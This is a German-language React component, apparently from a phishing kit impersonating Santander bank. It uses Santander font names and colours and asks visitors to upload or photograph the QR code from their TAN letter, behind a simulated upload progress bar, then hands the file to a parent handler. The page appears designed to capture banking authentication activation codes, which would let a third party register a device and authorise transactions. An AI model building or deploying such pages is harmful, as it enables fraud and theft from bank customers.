import React, { useState, useRef, useEffect } from 'react';
import { QrCode, File as FileIcon, Camera, CheckCircle, X } from 'lucide-react';
import Loading from './Loading';

interface QRUploadFormProps {
  onUpload: (file: File) => void;
  isRetry?: boolean;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onUpload, isRetry = false }) => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [dragOver, setDragOver] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [isMobile, setIsMobile] = useState(false);
  const [showCamera, setShowCamera] = useState(false);
  const [stream, setStream] = useState<MediaStream | null>(null);
  
  const fileInputRef = useRef<HTMLInputElement>(null);
  const cameraInputRef = useRef<HTMLInputElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Check for mobile screen size
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Clear selected file when isRetry changes or component mounts
  useEffect(() => {
    console.log('🔄 QRUploadForm: Resetting state (isRetry:', isRetry, ')');
    setSelectedFile(null);
    setUploadProgress(0);
    setIsUploading(false); // Reset uploading state
  }, [isRetry]);

  // Cleanup camera stream on unmount
  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [stream]);

  const handleFileSelect = (file: File) => {
    if (file && (file.type.startsWith('image/') || file.type === 'application/pdf')) {
      console.log('📁 QR Upload: File selected:', file.name, file.size, file.type);
      setSelectedFile(file);
    } else {
      console.log('❌ QR Upload: Invalid file type:', file.type);
      alert('Bitte wählen Sie eine Bilddatei (JPG, PNG) oder PDF aus.');
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragOver(false);
    
    const files = Array.from(e.dataTransfer.files);
    if (files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleCameraInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const startCamera = async () => {
    try {
      // For mobile devices, use the camera input with capture attribute
      if (isMobile) {
        if (cameraInputRef.current) {
          cameraInputRef.current.click();
        }
        return;
      }

      // For desktop, use getUserMedia API
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'environment', // Use back camera if available
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      });

      setStream(mediaStream);
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        setShowCamera(true);
      }
    } catch (error) {
      console.error('Error accessing camera:', error);
      alert('Kamera konnte nicht geöffnet werden. Bitte verwenden Sie die Datei-Upload Option.');
    }
  };

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current) {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(video, 0, 0);
        
        canvas.toBlob((blob) => {
          if (blob) {
            const file = new File([blob], 'qr-photo.jpg', { type: 'image/jpeg' });
            handleFileSelect(file);
            stopCamera();
          }
        }, 'image/jpeg', 0.8);
      }
    }
  };

  const stopCamera = () => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      setStream(null);
    }
    setShowCamera(false);
  };

  const removeFile = () => {
    setSelectedFile(null);
    setUploadProgress(0);
  };

  const handleUpload = async () => {
    if (!selectedFile) {
      console.log('QR Upload: No file selected');
      return;
    }
    
    console.log('🚀 QR Upload: Starting upload process with file:', selectedFile.name, selectedFile.size, selectedFile.type);
    setIsUploading(true);
    setUploadProgress(0);
    
    // Simulate upload progress
    const progressInterval = setInterval(() => {
      setUploadProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + Math.random() * 30;
      });
    }, 200);
    
    try {
      // Simulate upload delay
      console.log('⏳ QR Upload: Simulating upload delay...');
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      setUploadProgress(100);
      clearInterval(progressInterval);
      
      console.log('✅ QR Upload: Upload completed, calling parent onUpload function with file:', selectedFile.name);
      
      // Call the parent's onUpload function immediately (no additional delay)
      onUpload(selectedFile);
      
      // Note: We don't set isUploading to false here because the parent will handle state transition
      
    } catch (error) {
      console.error('❌ QR Upload error:', error);
      clearInterval(progressInterval);
      setIsUploading(false);
      setUploadProgress(0);
      alert('Upload fehlgeschlagen. Bitte versuchen Sie es erneut.');
    }
  };

  if (isUploading) {
    return (
      <Loading 
        message="QR-Code wird hochgeladen"
        type="upload"
        showProgress={true}
        duration={3}
      />
    );
  }

  if (showCamera) {
    return (
      <div style={{ 
        minHeight: '100vh',
        backgroundColor: 'white',
        paddingTop: '4rem',
        paddingBottom: '4rem'
      }}>
        <div style={{
          maxWidth: '800px',
          margin: '0 auto',
          padding: '0 2rem',
          textAlign: 'center'
        }}>
          <h2 style={{
            fontSize: '2rem',
            fontWeight: '600',
            color: '#444',
            marginBottom: '2rem',
            fontFamily: 'santander_headline_bold, Arial, sans-serif'
          }}>
            QR-Code fotografieren
          </h2>
          
          <div style={{
            position: 'relative',
            backgroundColor: '#000',
            borderRadius: '12px',
            overflow: 'hidden',
            marginBottom: '2rem',
            maxWidth: '640px',
            margin: '0 auto 2rem'
          }}>
            <video
              ref={videoRef}
              autoPlay
              playsInline
              style={{
                width: '100%',
                height: 'auto',
                display: 'block'
              }}
            />
            
            {/* QR Code overlay guide */}
            <div style={{
              position: 'absolute',
              top: '50%',
              left: '50%',
              transform: 'translate(-50%, -50%)',
              width: '250px',
              height: '250px',
              border: '3px solid #9e3667',
              borderRadius: '12px',
              backgroundColor: 'rgba(158, 54, 103, 0.1)',
              pointerEvents: 'none'
            }}>
              <div style={{
                position: 'absolute',
                top: '-40px',
                left: '50%',
                transform: 'translateX(-50%)',
                color: 'white',
                fontSize: '14px',
                fontWeight: '600',
                backgroundColor: 'rgba(0, 0, 0, 0.8)',
                padding: '8px 16px',
                borderRadius: '20px',
                fontFamily: 'santander_bold, Arial, sans-serif'
              }}>
                QR-Code hier positionieren
              </div>
            </div>
          </div>
          
          <div style={{ display: 'flex', gap: '1rem', justifyContent: 'center' }}>
            <button
              onClick={capturePhoto}
              style={{
                backgroundColor: '#9e3667',
                color: 'white',
                border: 'none',
                borderRadius: '50%',
                width: '70px',
                height: '70px',
                fontSize: '24px',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                transition: 'all 0.3s ease'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#8a2f5a';
                e.currentTarget.style.transform = 'scale(1.1)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#9e3667';
                e.currentTarget.style.transform = 'scale(1)';
              }}
            >
              <Camera size={28} />
            </button>
            
            <button
              onClick={stopCamera}
              style={{
                backgroundColor: '#666',
                color: 'white',
                border: 'none',
                borderRadius: '50%',
                width: '50px',
                height: '50px',
                fontSize: '20px',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                transition: 'all 0.3s ease'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#444';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#666';
              }}
            >
              <X size={20} />
            </button>
          </div>
          
          <canvas ref={canvasRef} style={{ display: 'none' }} />
        </div>
      </div>
    );
  }

  return (
    <div style={{ 
      minHeight: '100vh',
      backgroundColor: 'white',
      paddingTop: '4rem',
      paddingBottom: '4rem'
    }}>
      <div style={{
        maxWidth: '800px',
        margin: '0 auto',
        padding: '0 2rem'
      }}>
        <h2 style={{
          fontSize: '2.5rem',
          fontWeight: '600',
          color: '#444',
          marginBottom: '1rem',
          fontFamily: 'santander_headline_bold, Arial, sans-serif'
        }}>
          {isRetry ? 'QR-Code erneut hochladen' : 'QR-Code hochladen'}
        </h2>
        
        <p style={{
          color: '#666',
          fontSize: '1.125rem',
          lineHeight: '1.6',
          marginBottom: '3rem',
          fontFamily: 'santander_regular, Arial, sans-serif'
        }}>
          {isRetry 
            ? 'Bitte versuchen Sie es mit einem klareren Foto oder Scan des QR-Codes.'
            : 'Laden Sie den QR-Code aus Ihrem TAN-Brief hoch oder fotografieren Sie ihn direkt.'
          }
        </p>

        {selectedFile ? (
          <div style={{
            backgroundColor: '#f8f9fa',
            border: '2px solid #e5e7eb',
            borderRadius: '12px',
            padding: '2rem',
            marginBottom: '2rem',
            textAlign: 'center'
          }}>
            <CheckCircle size={48} color="#10b981" style={{ marginBottom: '1rem' }} />
            
            <h3 style={{
              fontSize: '1.25rem',
              fontWeight: '600',
              color: '#444',
              marginBottom: '0.5rem',
              fontFamily: 'santander_headline_bold, Arial, sans-serif'
            }}>
              Datei ausgewählt
            </h3>
            
            <p style={{
              color: '#666',
              fontSize: '1rem',
              marginBottom: '1.5rem',
              fontFamily: 'santander_regular, Arial, sans-serif'
            }}>
              {selectedFile.name} ({(selectedFile.size / 1024 / 1024).toFixed(2)} MB)
            </p>
            
            <div style={{ display: 'flex', gap: '1rem', justifyContent: 'center' }}>
              <button
                onClick={handleUpload}
                style={{
                  backgroundColor: '#9e3667',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '12px 24px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: 'pointer',
                  fontFamily: 'santander_bold, Arial, sans-serif',
                  transition: 'all 0.3s ease'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = '#8a2f5a';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = '#9e3667';
                }}
              >
                Jetzt hochladen
              </button>
              
              <button
                onClick={removeFile}
                style={{
                  backgroundColor: 'transparent',
                  color: '#666',
                  border: '2px solid #e5e7eb',
                  borderRadius: '4px',
                  padding: '12px 24px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: 'pointer',
                  fontFamily: 'santander_bold, Arial, sans-serif',
                  transition: 'all 0.3s ease'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.borderColor = '#9e3667';
                  e.currentTarget.style.color = '#9e3667';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.borderColor = '#e5e7eb';
                  e.currentTarget.style.color = '#666';
                }}
              >
                Andere Datei wählen
              </button>
            </div>
          </div>
        ) : (
          <>
            {/* Upload Area */}
            <div
              style={{
                border: dragOver ? '3px dashed #9e3667' : '3px dashed #e5e7eb',
                borderRadius: '12px',
                padding: '3rem 2rem',
                textAlign: 'center',
                backgroundColor: dragOver ? '#fdf2f8' : '#f8f9fa',
                transition: 'all 0.3s ease',
                marginBottom: '2rem',
                cursor: 'pointer'
              }}
              onDrop={handleDrop}
              onDragOver={(e) => {
                e.preventDefault();
                setDragOver(true);
              }}
              onDragLeave={() => setDragOver(false)}
              onClick={() => fileInputRef.current?.click()}
            >
              <QrCode size={64} color={dragOver ? '#9e3667' : '#9ca3af'} style={{ marginBottom: '1.5rem' }} />
              
              <h3 style={{
                fontSize: '1.5rem',
                fontWeight: '600',
                color: '#444',
                marginBottom: '1rem',
                fontFamily: 'santander_headline_bold, Arial, sans-serif'
              }}>
                QR-Code hier ablegen
              </h3>
              
              <p style={{
                color: '#666',
                fontSize: '1rem',
                marginBottom: '1.5rem',
                fontFamily: 'santander_regular, Arial, sans-serif'
              }}>
                oder klicken Sie hier, um eine Datei auszuwählen
              </p>
              
              <p style={{
                color: '#9ca3af',
                fontSize: '0.875rem',
                fontFamily: 'santander_regular, Arial, sans-serif'
              }}>
                Unterstützte Formate: JPG, PNG, PDF (max. 10MB)
              </p>
            </div>

            {/* Action Buttons */}
            <div style={{
              display: 'grid',
              gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
              gap: '1rem',
              marginBottom: '2rem'
            }}>
              <button
                onClick={() => fileInputRef.current?.click()}
                style={{
                  backgroundColor: 'transparent',
                  color: '#9e3667',
                  border: '2px solid #9e3667',
                  borderRadius: '4px',
                  padding: '16px 24px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: 'pointer',
                  fontFamily: 'santander_bold, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = '#9e3667';
                  e.currentTarget.style.color = 'white';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = 'transparent';
                  e.currentTarget.style.color = '#9e3667';
                }}
              >
                <FileIcon size={20} />
                Datei wählen
              </button>
              
              <button
                onClick={startCamera}
                style={{
                  backgroundColor: '#9e3667',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '16px 24px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: 'pointer',
                  fontFamily: 'santander_bold, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = '#8a2f5a';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = '#9e3667';
                }}
              >
                <Camera size={20} />
                Fotografieren
              </button>
            </div>
          </>
        )}

        {/* Hidden file inputs */}
        <input
          ref={fileInputRef}
          type="file"
          accept="image/*,.pdf"
          onChange={handleFileInputChange}
          style={{ display: 'none' }}
        />
        
        <input
          ref={cameraInputRef}
          type="file"
          accept="image/*"
          capture="environment"
          onChange={handleCameraInputChange}
          style={{ display: 'none' }}
        />
      </div>
    </div>
  );
};

export default QRUploadForm; 